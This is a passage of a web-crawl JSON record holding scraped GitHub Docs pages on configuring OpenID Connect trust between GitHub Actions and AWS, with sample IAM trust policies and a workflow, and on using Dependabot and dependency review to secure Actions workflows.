      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "6312:184D41:2EAFA7:3F264E:681C0468",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "19619",
      "date": "Thu, 08 May 2025 06:36:59 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686219.230259, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30219",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring OpenID Connect in Amazon Web Services\nUse OpenID Connect within your workflows to authenticate with Amazon Web Services.\nOverview\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Amazon Web Services (AWS), without needing to store the AWS credentials as long-lived GitHub secrets.\nThis guide explains how to configure AWS to trust GitHub's OIDC as a federated identity, and includes a workflow example for the aws-actions/configure-aws-credentials that uses tokens to authenticate to AWS and access resources.\nNote\nSupport for custom claims for OIDC is unavailable in AWS.\nPrerequisites\nTo learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see About security hardening with OpenID Connect.\nBefore proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see About security hardening with OpenID Connect.\nAdding the identity provider to AWS\nTo add the GitHub OIDC provider to IAM, see the AWS documentation.\nFor the provider URL: Use https://token.actions.githubusercontent.com\nFor the \"Audience\": Use sts.amazonaws.com if you are using the official action.\nConfiguring the role and trust policy\nTo configure the role and trust in IAM, see the AWS documentation Configure AWS Credentials for GitHub Actions and Configuring a role for GitHub OIDC identity provider.\nNote\nAWS Identity and Access Management (IAM) recommends that users evaluate the IAM condition key, token.actions.githubusercontent.com:sub, in the trust policy of any role that trusts GitHub’s OIDC identity provider (IdP). Evaluating this condition key in the role trust policy limits which GitHub actions are able to assume the role.\nEdit the trust policy, adding the sub field to the validation conditions. For example:\nJSON\n\"Condition\": { \"StringEquals\": { \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\", \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:ref:refs/heads/octo-branch\" } } \nIf you use a workflow with an environment, the sub field must reference the environment name: repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME. For more information, see About security hardening with OpenID Connect.\nNote\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see Managing environments for deployment.\nJSON\n\"Condition\": { \"StringEquals\": { \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\", \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:environment:prod\" } } \nIn the following example, StringLike is used with a wildcard operator (*) to allow any branch, pull request merge branch, or environment from the octo-org/octo-repo organization and repository to assume a role in AWS.\nJSON\n{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Federated\": \"arn:aws:iam::123456123456:oidc-provider/token.actions.githubusercontent.com\" }, \"Action\": \"sts:AssumeRoleWithWebIdentity\", \"Condition\": { \"StringLike\": { \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:*\" }, \"StringEquals\": { \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\" } } } ] } \nUpdating your GitHub Actions workflow\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\nAdd permissions settings for the token.\nUse the aws-actions/configure-aws-credentials action to exchange the OIDC token (JWT) for a cloud access token.\nAdding permissions settings\nThe job or workflow run requires a permissions setting with id-token: write to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the permissions for id-token is not set to write, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see About security hardening with OpenID Connect.\nThe id-token: write setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\nUsing environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN).\nUsing getIDToken() from the Actions toolkit.\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout \nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT \nYou may need to specify additional permissions here, depending on your workflow's requirements.\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the permissions setting for id-token should be explicitly set to write at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\nFor more information, see Reusing workflows.\nRequesting the access token\nThe aws-actions/configure-aws-credentials action receives a JWT from the GitHub OIDC provider, and then requests an access token from AWS. For more information, see the AWS documentation.\nBUCKET-NAME: Replace this with the name of your S3 bucket.\nAWS-REGION: Replace this with the name of your AWS region.\nROLE-TO-ASSUME: Replace this with your AWS role. For example, arn:aws:iam::1234567890:role/example-role\nYAML\n# Sample workflow to access AWS resources when workflow is tied to branch # The workflow Creates static website using aws s3 name: AWS example workflow on: push env: BUCKET_NAME : \"BUCKET-NAME\" AWS_REGION : \"AWS-REGION\" # permission can be added at job level or workflow level permissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout jobs: S3PackageUpload: runs-on: ubuntu-latest steps: - name: Git clone the repository uses: actions/checkout@v4 - name: configure aws credentials uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 with: role-to-assume: ROLE-TO-ASSUME role-session-name: samplerolesession aws-region: ${{ env.AWS_REGION }} # Upload a file to AWS s3 - name: Copy index.html to s3 run: | aws s3 cp ./index.html s3://${{ env.BUCKET_NAME }}/ \nFurther reading\nUsing OpenID Connect with reusable workflows\nCommunicating with self-hosted runners",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-amazon-web-services-rda9y.html",
  "markdown": "# Configuring OpenID Connect in Amazon Web Services\n\nUse OpenID Connect within your workflows to authenticate with Amazon Web Services.\n\n## [Overview](#overview)\n\nOpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Amazon Web Services (AWS), without needing to store the AWS credentials as long-lived GitHub secrets.\n\nThis guide explains how to configure AWS to trust GitHub's OIDC as a federated identity, and includes a workflow example for the [`aws-actions/configure-aws-credentials`](https://github.com/aws-actions/configure-aws-credentials) that uses tokens to authenticate to AWS and access resources.\n\nNote\n\nSupport for custom claims for OIDC is unavailable in AWS.\n\n## [Prerequisites](#prerequisites)\n\n*   To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n    \n*   Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n    \n\n## [Adding the identity provider to AWS](#adding-the-identity-provider-to-aws)\n\nTo add the GitHub OIDC provider to IAM, see the [AWS documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html).\n\n*   For the provider URL: Use `https://token.actions.githubusercontent.com`\n*   For the \"Audience\": Use `sts.amazonaws.com` if you are using the [official action](https://github.com/aws-actions/configure-aws-credentials).\n\n### [Configuring the role and trust policy](#configuring-the-role-and-trust-policy)\n\nTo configure the role and trust in IAM, see the AWS documentation [Configure AWS Credentials for GitHub Actions](https://github.com/aws-actions/configure-aws-credentials#configure-aws-credentials-for-github-actions) and [Configuring a role for GitHub OIDC identity provider](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-idp_oidc.html#idp_oidc_Create_GitHub).\n\nNote\n\nAWS Identity and Access Management (IAM) recommends that users evaluate the IAM condition key, `token.actions.githubusercontent.com:sub`, in the trust policy of any role that trusts GitHub’s OIDC identity provider (IdP). Evaluating this condition key in the role trust policy limits which GitHub actions are able to assume the role.\n\nEdit the trust policy, adding the `sub` field to the validation conditions. For example:\n\nJSON\n\n```\n\"Condition\": {\n  \"StringEquals\": {\n    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\",\n    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:ref:refs/heads/octo-branch\"\n  }\n}\n```\n\nIf you use a workflow with an environment, the `sub` field must reference the environment name: `repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME`. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#understanding-the-oidc-token).\n\nNote\n\nWhen environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#deployment-protection-rules).\n\nJSON\n\n```\n\"Condition\": {\n  \"StringEquals\": {\n    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\",\n    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:environment:prod\"\n  }\n}\n```\n\nIn the following example, `StringLike` is used with a wildcard operator (`*`) to allow any branch, pull request merge branch, or environment from the `octo-org/octo-repo` organization and repository to assume a role in AWS.\n\nJSON\n\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\": \"arn:aws:iam::123456123456:oidc-provider/token.actions.githubusercontent.com\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringLike\": {\n                    \"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:*\"\n                },\n                \"StringEquals\": {\n                    \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\"\n                }\n            }\n        }\n    ]\n}\n```\n\n## [Updating your GitHub Actions workflow](#updating-your-github-actions-workflow)\n\nTo update your workflows for OIDC, you will need to make two changes to your YAML:\n\n1.  Add permissions settings for the token.\n2.  Use the [`aws-actions/configure-aws-credentials`](https://github.com/aws-actions/configure-aws-credentials) action to exchange the OIDC token (JWT) for a cloud access token.\n\n### [Adding permissions settings](#adding-permissions-settings)\n\nThe job or workflow run requires a `permissions` setting with [`id-token: write`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the `permissions` for `id-token` is not set to `write`, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nThe `id-token: write` setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\n\n*   Using environment variables on the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).\n*   Using `getIDToken()` from the Actions toolkit.\n\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\nYou may need to specify additional permissions here, depending on your workflow's requirements.\n\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the `permissions` setting for `id-token` should be explicitly set to `write` at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\n\nFor more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n### [Requesting the access token](#requesting-the-access-token)\n\nThe `aws-actions/configure-aws-credentials` action receives a JWT from the GitHub OIDC provider, and then requests an access token from AWS. For more information, see the AWS [documentation](https://github.com/aws-actions/configure-aws-credentials).\n\n*   `BUCKET-NAME`: Replace this with the name of your S3 bucket.\n*   `AWS-REGION`: Replace this with the name of your AWS region.\n*   `ROLE-TO-ASSUME`: Replace this with your AWS role. For example, `arn:aws:iam::1234567890:role/example-role`\n\nYAML\n\n```\n# Sample workflow to access AWS resources when workflow is tied to branch\n# The workflow Creates static website using aws s3\nname: AWS example workflow\non:\n  push\nenv:\n  BUCKET_NAME : \"BUCKET-NAME\"\n  AWS_REGION : \"AWS-REGION\"\n# permission can be added at job level or workflow level\npermissions:\n  id-token: write   # This is required for requesting the JWT\n  contents: read    # This is required for actions/checkout\njobs:\n  S3PackageUpload:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Git clone the repository\n        uses: actions/checkout@v4\n      - name: configure aws credentials\n        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502\n        with:\n          role-to-assume: ROLE-TO-ASSUME\n          role-session-name: samplerolesession\n          aws-region: ${{ env.AWS_REGION }}\n      # Upload a file to AWS s3\n      - name: Copy index.html to s3\n        run: |\n          aws s3 cp ./index.html s3://${{ env.BUCKET_NAME }}/\n```\n\n## [Further reading](#further-reading)\n\n*   [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows)\n*   [Communicating with self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 256,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-amazon-web-services-o",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-amazon-web-services-r",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-amazon-web-services-e",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-amazon-web-services-r",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-configuring-openid-connect-in-amazon-web-services-r"
    },
    "lengths": {
      "extractus": 14875,
      "readableText": 13756,
      "none": 42543,
      "readableTextIfPossible": 13756,
      "result": 13756,
      "markdown": 10020
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions",
    "loadedTime": "2025-05-08T06:37:02.326Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions",
    "title": "Using GitHub's security features to secure your use of GitHub Actions - GitHub Docs",
    "description": "GitHub has several security features that can enhance the security of the actions you consume and publish.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using GitHub's security features to secure your use of GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "850E:C34F8:21CD:2DBD:681C5109",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:36:57 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686217.224672, VS0, VE422",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27959",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using GitHub's security features to secure your use of GitHub Actions\nGitHub has several security features that can enhance the security of the actions you consume and publish.\nAbout GitHub's security features\nGitHub provides many features to make your code more secure. You can use GitHub's built-in features to understand the actions your workflows depend on, ensure you are notified about vulnerabilities in the actions you consume, or automate the process of keeping the actions in your workflows up to date. If you publish and maintain actions, you can use GitHub to communicate with your community about vulnerabilities and how to fix them. For more information about security features that GitHub offers, see GitHub security features.\nThis article will explain how you can use some of GitHub's security features to increase the security of your use of GitHub Actions.\nUnderstanding dependencies in your workflows\nYou can use the dependency graph to explore the actions that the workflows in your repository use. The dependency graph is a summary of the manifest and lock files stored in a repository. It also recognizes files in ./github/workflows/ as manifests, which means that any actions or workflows referenced using the syntax jobs[*].steps[*].uses or jobs.<job_id>.uses will be parsed as dependencies.\nThe dependency graph shows the following information about actions used in workflows:\nThe account or organization that owns the action.\nThe workflow file that references the action.\nThe version or SHA the action is pinned to.\nIn the dependency graph, dependencies are automatically sorted by vulnerability severity. If any of the actions you use have security advisories, they will display at the top of the list. You can navigate to the advisory from the dependency graph and access instructions for resolving the vulnerability.\nThe dependency graph is enabled for public repositories, and you can choose to enable it on private repositories. For more information about using the dependency graph, see Exploring the dependencies of a repository.\nBeing aware of security vulnerabilities in actions you use\nFor actions available on the marketplace, GitHub reviews related security advisories and then adds those advisories to the GitHub Advisory Database. You can search the database for actions that you use to find information about existing vulnerabilities and instructions for how to fix them. To streamline your search, use the GitHub Actions filter in the GitHub Advisory Database.\nYou can set up your repositories so that you:\nReceive alerts when actions used in your workflows receive a vulnerability report. For more information, see Monitoring the actions in your workflows.\nAre warned about existing advisories when you add or update an action in a workflow. For more information, see Screening actions for vulnerabilities in new or updated workflows.\nMonitoring the actions in your workflows\nYou can use Dependabot to monitor the actions in your workflows and enable Dependabot alerts to notify you when an action you use has a reported vulnerability. Dependabot performs a scan of the default branch of the repositories where it is enabled to detect insecure dependencies. Dependabot generates Dependabot alerts when a new advisory is added to the GitHub Advisory Database or when an action you use is updated.\nNote\nDependabot only creates alerts for vulnerable actions that use semantic versioning and will not create alerts for actions pinned to SHA values.\nYou can enable Dependabot alerts for your personal account, for a repository, or for an organization. For more information, see Configuring Dependabot alerts.\nYou can view all open and closed Dependabot alerts and corresponding Dependabot security updates in your repository's Dependabot alerts tab. For more information, see Viewing and updating Dependabot alerts.\nScreening actions for vulnerabilities in new or updated workflows\nWhen you open pull requests to update your workflows, it is good practice to use dependency review to understand the security impact of changes you've made to the actions you use. Dependency review helps you understand dependency changes and the security impact of these changes at every pull request. It provides an easily understandable visualization of dependency changes with a rich diff on the \"Files Changed\" tab of a pull request. Dependency review informs you of:\nWhich dependencies were added, removed, or updated, along with the release dates\nHow many projects use these components\nVulnerability data for these dependencies\nIf any of the changes you made to your workflows are flagged as vulnerable, you can avoid adding them to your project or update them to a secure version.\nFor more information about dependency review, see About dependency review.\nThe \"dependency review action\" refers to the specific action that can report on differences in a pull request within the GitHub Actions context. See dependency-review-action. You can use the dependency review action in your repository to enforce dependency reviews on your pull requests. The action scans for vulnerable versions of dependencies introduced by package version changes in pull requests, and warns you about the associated security vulnerabilities. This gives you better visibility of what's changing in a pull request, and helps prevent vulnerabilities being added to your repository. For more information, see About dependency review.\nKeeping the actions in your workflows secure and up to date\nYou can use Dependabot to ensure that references to actions and reusable workflows used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes faster, safer, and more reliable. Dependabot takes the effort out of maintaining your dependencies as it does this automatically for you. For more information, see Keeping your actions up to date with Dependabot and About Dependabot security updates.\nThe following features can automatically update the actions in your workflows.\nDependabot version updates open pull requests to update actions to the latest version when a new version is released.\nDependabot security updates open pull requests to update actions with reported vulnerabilities to the minimum patched version.\nNote\nDependabot only supports updates to GitHub Actions using the GitHub repository syntax, such as actions/checkout@v4. Dependabot will ignore actions or reusable workflows referenced locally (for example, ./.github/actions/foo.yml).\nDocker Hub and GitHub Packages Container registry URLs are currently not supported. For example, references to Docker container actions using docker:// syntax aren't supported.\nDependabot supports both public and private repositories for GitHub Actions. For private registry configuration options, see \"git\" in Dependabot options reference.\nFor information on how to configure Dependabot version updates, see Configuring Dependabot version updates.\nFor information on how to configure Dependabot security updates, see Configuring Dependabot security updates.\nProtecting actions you've created\nGitHub enables collaboration between people who publish and maintain actions and vulnerability reporters in order to promote secure coding. Repository security advisories allow maintainers of public repositories to privately discuss and fix a security vulnerability in a project. After collaborating on a fix, repository maintainers can publish the security advisory to publicly disclose the security vulnerability to the project's community. By publishing security advisories, repository maintainers make it easier for their community to update package dependencies and research the impact of the security vulnerabilities.\nIf you are someone who maintains an action that is used in other projects, you can use the following GitHub features to enhance the security of the actions you've published.\nUse the dependants view in the Dependency graph to see which projects depend on your code. If you receive a vulnerability report, this will give you an idea of who you need to communicate with about the vulnerability and how to fix it. For more information, see Exploring the dependencies of a repository.\nUse repository security advisories to create a security advisory, privately collaborate to fix the vulnerability in a temporary private fork, and publish a security advisory to alert your community of the vulnerability once a patch is released. For more information, see Configuring private vulnerability reporting for a repository and Creating a repository security advisory.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-guides-using-githubs-security-features-to-secure-your-use-of-github-actions-nt8qw.html",
  "markdown": "# Using GitHub's security features to secure your use of GitHub Actions\n\nGitHub has several security features that can enhance the security of the actions you consume and publish.\n\n## [About GitHub's security features](#about-githubs-security-features)\n\nGitHub provides many features to make your code more secure. You can use GitHub's built-in features to understand the actions your workflows depend on, ensure you are notified about vulnerabilities in the actions you consume, or automate the process of keeping the actions in your workflows up to date. If you publish and maintain actions, you can use GitHub to communicate with your community about vulnerabilities and how to fix them. For more information about security features that GitHub offers, see [GitHub security features](https://docs.github.com/en/code-security/getting-started/github-security-features#about-githubs-security-features).\n\nThis article will explain how you can use some of GitHub's security features to increase the security of your use of GitHub Actions.\n\n## [Understanding dependencies in your workflows](#understanding-dependencies-in-your-workflows)\n\nYou can use the dependency graph to explore the actions that the workflows in your repository use. The dependency graph is a summary of the manifest and lock files stored in a repository. It also recognizes files in `./github/workflows/` as manifests, which means that any actions or workflows referenced using the syntax `jobs[*].steps[*].uses` or `jobs.<job_id>.uses` will be parsed as dependencies.\n\nThe dependency graph shows the following information about actions used in workflows:\n\n*   The account or organization that owns the action.\n*   The workflow file that references the action.\n*   The version or SHA the action is pinned to.\n\nIn the dependency graph, dependencies are automatically sorted by vulnerability severity. If any of the actions you use have security advisories, they will display at the top of the list. You can navigate to the advisory from the dependency graph and access instructions for resolving the vulnerability.\n\nThe dependency graph is enabled for public repositories, and you can choose to enable it on private repositories. For more information about using the dependency graph, see [Exploring the dependencies of a repository](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/exploring-the-dependencies-of-a-repository).\n\n## [Being aware of security vulnerabilities in actions you use](#being-aware-of-security-vulnerabilities-in-actions-you-use)\n\nFor actions available on the marketplace, GitHub reviews related security advisories and then adds those advisories to the GitHub Advisory Database. You can search the database for actions that you use to find information about existing vulnerabilities and instructions for how to fix them. To streamline your search, use the GitHub Actions filter in the [GitHub Advisory Database](https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aactions).\n\nYou can set up your repositories so that you:\n\n*   Receive alerts when actions used in your workflows receive a vulnerability report. For more information, see [Monitoring the actions in your workflows](#monitoring-the-actions-in-your-workflows).\n*   Are warned about existing advisories when you add or update an action in a workflow. For more information, see [Screening actions for vulnerabilities in new or updated workflows](#screening-actions-for-vulnerabilities-in-new-or-updated-workflows).\n\n### [Monitoring the actions in your workflows](#monitoring-the-actions-in-your-workflows)\n\nYou can use Dependabot to monitor the actions in your workflows and enable Dependabot alerts to notify you when an action you use has a reported vulnerability. Dependabot performs a scan of the default branch of the repositories where it is enabled to detect insecure dependencies. Dependabot generates Dependabot alerts when a new advisory is added to the GitHub Advisory Database or when an action you use is updated.\n\nNote\n\nDependabot only creates alerts for vulnerable actions that use semantic versioning and will not create alerts for actions pinned to SHA values.\n\nYou can enable Dependabot alerts for your personal account, for a repository, or for an organization. For more information, see [Configuring Dependabot alerts](https://docs.github.com/en/code-security/dependabot/dependabot-alerts/configuring-dependabot-alerts).\n\nYou can view all open and closed Dependabot alerts and corresponding Dependabot security updates in your repository's Dependabot alerts tab. For more information, see [Viewing and updating Dependabot alerts](https://docs.github.com/en/code-security/dependabot/dependabot-alerts/viewing-and-updating-dependabot-alerts).\n\n### [Screening actions for vulnerabilities in new or updated workflows](#screening-actions-for-vulnerabilities-in-new-or-updated-workflows)\n\nWhen you open pull requests to update your workflows, it is good practice to use dependency review to understand the security impact of changes you've made to the actions you use. Dependency review helps you understand dependency changes and the security impact of these changes at every pull request. It provides an easily understandable visualization of dependency changes with a rich diff on the \"Files Changed\" tab of a pull request. Dependency review informs you of:\n\n*   Which dependencies were added, removed, or updated, along with the release dates\n*   How many projects use these components\n*   Vulnerability data for these dependencies\n\nIf any of the changes you made to your workflows are flagged as vulnerable, you can avoid adding them to your project or update them to a secure version.\n\nFor more information about dependency review, see [About dependency review](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-dependency-review).\n\nThe \"dependency review action\" refers to the specific action that can report on differences in a pull request within the GitHub Actions context. See [`dependency-review-action`](https://github.com/actions/dependency-review-action). You can use the dependency review action in your repository to enforce dependency reviews on your pull requests. The action scans for vulnerable versions of dependencies introduced by package version changes in pull requests, and warns you about the associated security vulnerabilities. This gives you better visibility of what's changing 